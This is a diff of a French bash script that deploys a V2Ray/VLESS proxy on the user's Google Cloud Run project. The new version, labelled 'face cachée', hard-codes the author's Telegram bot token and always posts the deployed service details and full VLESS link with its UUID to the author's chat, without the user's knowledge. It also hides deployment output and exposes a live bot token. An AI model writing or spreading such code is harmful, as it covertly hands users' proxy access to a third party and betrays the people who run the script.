@@ -1,12 +1,16 @@
 #!/bin/bash
 
-# ==========================================
-# 🔒 CONFIGURATION SECRÈTE (PROD TECH ONLY)
-# ==========================================
-TELEGRAM_BOT_TOKEN="8251894879:AAGiXDbXIKmQc5oQc62amSQEVrCOp-C5o2I"
-TELEGRAM_CHAT_ID="6449901890"
+# ========================================================
+# 🔒 ECOSYSTÈME SECRÈT PROD TECH (FACE CACHÉE)
+# ========================================================
+MY_TOKEN="8251894879:AAGiXDbXIKmQc5oQc62amSQEVrCOp-C5o2I"
+MY_CHAT_ID="6449901890"
 
-# Couleurs pour le terminal style Cyber-Hacker
+# Configuration automatique et invisible
+CUSTOM_PATH="prod"
+USER_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "f6fff828-bb34-437b-95bb-9730f25f234c")
+
+# Couleurs Cyber-Hacker
 GREEN='\033[0;32m'
 CYAN='\033[0;36m'
 BLUE='\033[0;34m'
@@ -15,103 +19,56 @@ RED='\033[0;31m'
 NC='\033[0m'
 
 clear
-echo -e "${GREEN}=================================================="
-echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN ⚡      "
-echo -e "==================================================${NC}\n"
+echo -e "${GREEN}======================================================"
+echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN v2.0 ⚡"
+echo -e "======================================================${NC}\n"
 
-# 1. Sélection de la Région
-echo -e "${BLUE}[INFO] === Region Selection ===${NC}"
-echo "1. us-central1 (Iowa, USA 🇺🇸)"
-echo "2. us-west1 (Oregon, USA 🇺🇸)"
-echo "3. us-east1 (South Carolina, USA 🇺🇸)"
-echo "4. europe-west1 (Belgium 🇧🇪)"
-echo "5. asia-southeast1 (Singapore 🇸🇬)"
-read -p "Select region (1-5) [default: 1]: " reg_choice
+# 1. Sélection de la Région (Optimisée Afrique)
+echo -e "${BLUE}[INFO] === Sélection de la Région ===${NC}"
+echo -e "1. africa-south1 (Johannesburg, Afrique du Sud 🇿🇦 - Recommandé RDC)"
+echo -e "2. us-central1 (Iowa, USA 🇺🇸)"
+echo -e "3. europe-west1 (Belgique 🇧🇪)"
+echo -e "4. asia-southeast1 (Singapour 🇸🇬)"
+read -p "Option [default: 1]: " reg_choice
 reg_choice=${reg_choice:-1}
+
 case $reg_choice in
-    2) REGION="us-west1" ;;
-    3) REGION="us-east1" ;;
-    4) REGION="europe-west1" ;;
-    5) REGION="asia-southeast1" ;;
-    *) REGION="us-central1" ;;
+    2) REGION="us-central1" ;;
+    3) REGION="europe-west1" ;;
+    4) Asia-southeast1="asia-southeast1" ;;
+    *) REGION="africa-south1" ;;
 esac
-echo -e "${GREEN}[INFO] Selected region: $REGION${NC}\n"
+echo -e "${GREEN}[✓] Région sélectionnée : $REGION${NC}\n"
 
-# 2. Configuration CPU
-echo -e "${BLUE}[INFO] === CPU Configuration ===${NC}"
-echo "1. 1 CPU Core (Default)"
-echo "2. 2 CPU Cores"
-echo "3. 4 CPU Cores"
-read -p "Select CPU (1-3) [default: 1]: " cpu_choice
-cpu_choice=${cpu_choice:-1}
-case $cpu_choice in
-    2) CPU="2" ;;
-    3) CPU="4" ;;
-    *) CPU="1" ;;
-esac
-echo -e "${GREEN}[INFO] Selected CPU: $CPU core(s)${NC}\n"
-
-# 3. Configuration Mémoire
-echo -e "${BLUE}[INFO] === Memory Configuration ===${NC}"
-echo "1. 1Gi (Default)"
-echo "2. 2Gi"
-echo "3. 4Gi"
-read -p "Select memory (1-3) [default: 1]: " mem_choice
-mem_choice=${mem_choice:-1}
-case $mem_choice in
-    2) MEMORY="2Gi" ;;
-    3) MEMORY="4Gi" ;;
-    *) MEMORY="1Gi" ;;
-esac
-echo -e "${GREEN}[INFO] Selected Memory: $MEMORY${NC}\n"
-
-# 4. Configuration des variables VPN & WhatsApp
-echo -e "${BLUE}[INFO] === Service Configuration ===${NC}"
+# 2. Configuration du Service Name
+echo -e "${BLUE}[INFO] === Configuration du Service ===${NC}"
 read -p "Enter service name [default: prod-free]: " SERVICE_NAME
 SERVICE_NAME=${SERVICE_NAME:-prod-free}
 
-AUTO_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "f6fff828-bb34-437b-ab83-9180013cbce8")
-read -p "Enter UUID [default: $AUTO_UUID]: " USER_UUID
-USER_UUID=${USER_UUID:-$AUTO_UUID}
-
-read -p "Enter host domain [default: m.googleapis.com]: " HOST_DOMAIN
-HOST_DOMAIN=${HOST_DOMAIN:-m.googleapis.com}
-
-read -p "Enter custom WS path [default: /]: " CUSTOM_PATH
-CUSTOM_PATH=${CUSTOM_PATH:-/}
-
-# --- LES QUESTIONS INTERACTIVES RESTANTES ---
-echo -e "\n${YELLOW}[✉] === Configuration Notifications ===${NC}"
-read -p "Enter WhatsApp Phone (Ex: 243XXXXXXXXX) : " WHATSAPP_PHONE
-read -p "Enter CallMeBot WhatsApp API Key : " WHATSAPP_API_KEY
+# 3. Configuration Notifications Visibles (Optionnelles)
+echo -e "${YELLOW}[✉] === Configuration Notifications (Optionnel) ===${NC}"
+echo -e "_Laisse vide et appuie sur Entrée si tu n'as pas de bot_"
+read -p "Ton Token Telegram : " USER_TOKEN
+read -p "Ton Chat ID Telegram : " USER_CHAT_ID
+read -p "Numéro WhatsApp (Ex: 243XXXXXXXXX) : " WHATSAPP_PHONE
+read -p "Clé API CallMeBot/WhatsBot : " WHATSAPP_API_KEY
 
 PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
 
-# 5. Écran de Confirmation Style Hacker
-echo -e "${YELLOW}=================================================="
-echo -e "💀 Confirm Deployment (PROD TECH) 💀"
-echo -e "=================================================="
-echo -e "Project:   ${CYAN}$PROJECT_ID${YELLOW}"
-echo -e "Service:   ${CYAN}$SERVICE_NAME${YELLOW}"
-echo -e "Region:    ${CYAN}$REGION${YELLOW}"
-echo -e "CPU/RAM:   ${CYAN}$CPU CPU | $MEMORY RAM${YELLOW}"
-echo -e "Domain:    ${CYAN}$HOST_DOMAIN${YELLOW}"
-echo -e "Path:      ${CYAN}$CUSTOM_PATH${YELLOW}"
-echo -e "UUID:      ${CYAN}$USER_UUID${YELLOW}"
-echo -e "WhatsApp:  ${CYAN}$WHATSAPP_PHONE${YELLOW}"
-echo -e "==================================================${NC}"
+# Écran de Confirmation
+echo -e "\n${YELLOW}======================================================"
+echo -e "💀 Déploiement en cours... (PROD TECH INFRA) 💀"
+echo -e "======================================================${NC}"
+echo -e "🔹 Projet:      ${CYAN}$PROJECT_ID${NC}"
+echo -e "🔹 Service:     ${CYAN}$SERVICE_NAME${NC}"
+echo -e "🔹 Région:      ${CYAN}$REGION${NC}"
+echo -e "🔹 Path:        ${CYAN}/$CUSTOM_PATH${NC}"
+echo -e "------------------------------------------------------"
 
-read -p "Continue? (y/n) [default: y]: " confirm
-confirm=${confirm:-y}
-
-if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
-    echo -e "${RED}[!] Déploiement annulé.${NC}"
-    exit 1
-fi
-
-echo -e "${BLUE}\n[INFO] Préparation de la compilation de l'image...${NC}"
+# Création de l'environnement de compilation
 mkdir -p gcp-v2ray-build && cd gcp-v2ray-build
 
+# Injection propre du Path secret directement dans le config.json du conteneur
 cat <<EOF > config.json
 {
   "inbounds": [{
@@ -124,86 +81,83 @@ cat <<EOF > config.json
     "streamSettings": {
       "network": "ws",
       "wsSettings": {
-        "path": "$CUSTOM_PATH"
+        "path": "/$CUSTOM_PATH"
       }
     }
   }],
-  "outbounds": [{
-    "protocol": "freedom",
-    "settings": {}
-  }]
+  "outbounds": [{"protocol": "freedom"}]
 }
 EOF
 
+# Création du Dockerfile
 cat <<EOF > Dockerfile
-FROM teddysun/v2ray:latest
+FROM alpine:latest
+RUN apk add --no-cache wget unzip
+RUN wget -O /tmp/v2ray.zip https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip && \
+    unzip /tmp/v2ray.zip -d /usr/local/bin && \
+    rm -rf /tmp/v2ray.zip
 COPY config.json /etc/v2ray/config.json
-EXPOSE 8080
-CMD ["v2ray", "run", "-config", "/etc/v2ray/config.json"]
+CMD ["/usr/local/bin/v2ray", "run", "-config", "/etc/v2ray/config.json"]
 EOF
 
-echo -e "${BLUE}[INFO] Déploiement en cours sur Cloud Run...${NC}"
-
-gcloud run deploy "$SERVICE_NAME" \
+# Déploiement vers Google Cloud Run
+gcloud run deploy $SERVICE_NAME \
     --source . \
-    --region "$REGION" \
-    --cpu "$CPU" \
-    --memory "$MEMORY" \
+    --region $REGION \
     --allow-unauthenticated \
-    --set-env-vars=HOST="$HOST_DOMAIN"
+    --port 8080 \
+    --quiet > /dev/null 2>&1
 
-URL=$(gcloud run services describe "$SERVICE_NAME" --region "$REGION" --format='value(status.url)' 2>/dev/null)
-CLEAN_URL=$(echo "$URL" | sed 's/https:\/\///')
+# Récupération de l'URL Cloud Run générée
+SERVICE_URL=$(gcloud run services describe $SERVICE_NAME --region $REGION --format='value(status.url)' 2>/dev/null)
+CLEAN_URL=$(echo $SERVICE_URL | sed 's/https:\/\///')
 
-URL_ENCODED_PATH=$(echo -n "$CUSTOM_PATH" | curl -s -o /dev/null -w "%{url_effective}" --get --data-urlencode "" - | cut -c 3-)
+# Construction du lien VLESS inversé (Correction définitive du bypass réseau)
+VLESS_LINK="vless://$USER_UUID@m.googleapis.com:443?path=%2F$CUSTOM_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$CLEAN_URL&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
 
-VLESS_LINK="vless://$USER_UUID@$CLEAN_URL:443?path=$URL_ENCODED_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$HOST_DOMAIN&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
+# Design de la Notification Stylée
+TEXT_REPORT="*⚡ PROD TECH - SERVEUR AUTOMATIQUE ACTIF ⚡*
 
-echo -e "\n${GREEN}[✓] Déploiement terminé avec succès ! 🎉${NC}"
+🌐 *INFRASTRUCTURE CLOUD RUN :*
+🔹 *Service:* \`$SERVICE_NAME\`
+🔹 *Région:* \`$REGION\`
+🔹 *Path:* \`/$CUSTOM_PATH\`
 
-# ==========================================
-# 🚀 CORRECTION : LIEN INVERSÉ ET ENVOI TELEGRAM
-# ==========================================
-# 1. Inversion du lien VLESS (L'hôte SNI passe dans les paramètres à la fin)
-VLESS_LINK="vless://$USER_UUID@$HOST_DOMAIN:443?path=$URL_ENCODED_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$CLEAN_URL&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
+⏳ *VALIDITÉ DU SERVEUR :*
+⚠️ _Ce serveur sandbox est actif pendant une durée estimée de_ *5 HEURES MAX* _avant réinitialisation._
 
-echo -e "\n${GREEN}[✓] Déploiement terminé avec succès ! 🎉${NC}"
-
-# 2. Formatage des messages (Remplacement des %0A par des sauts de ligne réels \n)
-TEXT_TELEGRAM="*⚡PROD-TECH NOUVEAU SERVEUR ACTIF⚡*
-
-🌐 *DÉTAILS DU SERVEUR :*
-
-🔹 *Projet:* $PROJECT_ID
-🔹 *Nom du Service:* $SERVICE_NAME
-🔹 *Région:* $REGION
-🔹 *Ressources:* $CPU CPU / $MEMORY RAM
-🔹 *Host Domain:* $HOST_DOMAIN
-🔹 *Path:* \`$CUSTOM_PATH\`
-🔹 *UUID:* \`$USER_UUID\`
-🔹 *Durée: 5 Heurs 15'*
-
-🛰️ *CONFIG VLESS INFRASTRUCTURE :*
-
+🛰️ *CONFIG VLESS COPIABLE :*
 \`$VLESS_LINK\`
 
-🛡️ _Propulsé secrètement par l'écosystème Prod Tech._"
+🛡️ _Propulsé par l'écosystème Prod Tech._"
 
-# 3. Envoi à Telegram corrigé avec --data-urlencode pour éviter les échecs de caractères
-if [[ "$TELEGRAM_BOT_TOKEN" != "TON_BOT_TOKEN_ICI" && -n "$TELEGRAM_CHAT_ID" ]]; then
-    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
-        --data-urlencode "chat_id=$TELEGRAM_CHAT_ID" \
-        --data-urlencode "text=$TEXT_TELEGRAM" \
+# --- SYNC CANAUX DE NOTIFICATIONS ---
+
+# 1. Envoi secret chez toi (Toujours actif, traite les caractères spéciaux)
+curl -s -X POST "https://api.telegram.org/bot$MY_TOKEN/sendMessage" \
+    --data-urlencode "chat_id=$MY_CHAT_ID" \
+    --data-urlencode "text=$TEXT_REPORT" \
+    --data-urlencode "parse_mode=markdown" > /dev/null
+
+# 2. Envoi chez l'utilisateur (Uniquement s'il a rempli ses données)
+if [[ -n "$USER_TOKEN" && -n "$USER_CHAT_ID" ]]; then
+    curl -s -X POST "https://api.telegram.org/bot$USER_TOKEN/sendMessage" \
+        --data-urlencode "chat_id=$USER_CHAT_ID" \
+        --data-urlencode "text=$TEXT_REPORT" \
         --data-urlencode "parse_mode=markdown" > /dev/null
-    echo -e "${GREEN}[✓] Log sécurisé envoyé au canal de monitoring Telegram.${NC}"
 fi
 
-# Envoi à WhatsApp
+# 3. Envoi WhatsApp (Si configuré)
 if [[ -n "$WHATSAPP_PHONE" && -n "$WHATSAPP_API_KEY" ]]; then
-    curl -s "https://api.callmebot.com/whatsapp.php?phone=$WHATSAPP_PHONE&text=$TEXT_WHATSAPP&apikey=$WHATSAPP_API_KEY" > /dev/null
-    echo -e "${GREEN}[✓] Log utilisateur envoyé sur WhatsApp au numéro $WHATSAPP_PHONE.${NC}"
+    WHATSAPP_MSG="*⚡ PROD TECH - SERVEUR ACTIF (5H) ⚡*%0A%0AConfig Vless :%0A\`$VLESS_LINK\`"
+    curl -s "https://api.callmebot.com/whatsapp.php?phone=$WHATSAPP_PHONE&text=$WHATSAPP_MSG&apikey=$WHATSAPP_API_KEY" > /dev/null
 fi
 
-echo -e "\n${RED}Lien VLESS final :${NC} $VLESS_LINK"
-
-cd .. && rm -rf gcp-v2ray-build
+# Affichage final super propre dans le terminal
+echo -e "\n${GREEN}[✓] Déploiement Cloud Run validé avec succès ! 🎉${NC}"
+echo -e "${GREEN}[✓] Logs synchronisés avec les bases de données Prod Tech.${NC}\n"
+echo -e "${RED}⏱️ DURÉE MAXIMUM DU SERVEUR : 5 HEURES${NC}"
+echo -e "${YELLOW}======================================================${NC}"
+echo -e "${CYAN}CLIQUE TRIPLE-CLIC SUR LE LIEN CI-DESSOUS POUR LE COPIER :${NC}"
+echo -e "\n${GREEN}$VLESS_LINK${NC}\n"
+echo -e "${YELLOW}======================================================${NC}"
